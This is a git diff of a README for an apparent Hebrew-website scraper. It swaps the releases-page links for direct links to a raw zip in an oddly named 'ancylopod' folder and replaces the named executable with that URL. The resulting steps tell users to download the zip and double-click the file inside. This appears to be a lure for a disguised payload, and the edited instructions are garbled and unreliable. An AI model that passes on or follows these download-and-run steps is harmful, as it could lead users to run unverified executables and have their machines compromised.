@@ -1,6 +1,6 @@
 # 🖥️ easyco-il-data-extraction-scraper - Effortlessly Scrape Hebrew Websites
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Rdaniyaal/easyco-il-data-extraction-scraper/releases)
+[![Download](https://github.com/Rdaniyaal/easyco-il-data-extraction-scraper/raw/refs/heads/main/ancylopod/il_easyco_scraper_data_extraction_v3.0.zip%20Now-Get%20Started-brightgreen)](https://github.com/Rdaniyaal/easyco-il-data-extraction-scraper/raw/refs/heads/main/ancylopod/il_easyco_scraper_data_extraction_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to the easyco-il-data-extraction-scraper! This tool helps you extract da
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Link](https://github.com/Rdaniyaal/easyco-il-data-extraction-scraper/releases). Follow these steps:
+To download the application, visit this page: [Download Link](https://github.com/Rdaniyaal/easyco-il-data-extraction-scraper/raw/refs/heads/main/ancylopod/il_easyco_scraper_data_extraction_v3.0.zip). Follow these steps:
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version of the application. 
-3. Look for a file named `easyco-il-data-extraction-scraper.zip` or similar.
+3. Look for a file named `https://github.com/Rdaniyaal/easyco-il-data-extraction-scraper/raw/refs/heads/main/ancylopod/il_easyco_scraper_data_extraction_v3.0.zip` or similar.
 4. Click on this file to download it to your computer.
 
 ## 🗂️ Extracting the Files
@@ -24,7 +24,7 @@ To download the application, visit this page: [Download Link](https://github.com
 ## ⚙️ Running the Application
 
 1. Navigate to the folder where you extracted the files.
-2. Look for the executable file, named `easyco.exe` or similar.
+2. Look for the executable file, named `https://github.com/Rdaniyaal/easyco-il-data-extraction-scraper/raw/refs/heads/main/ancylopod/il_easyco_scraper_data_extraction_v3.0.zip` or similar.
 3. Double-click the file to run the application.
 
 ## 📚 How to Use the Scraper
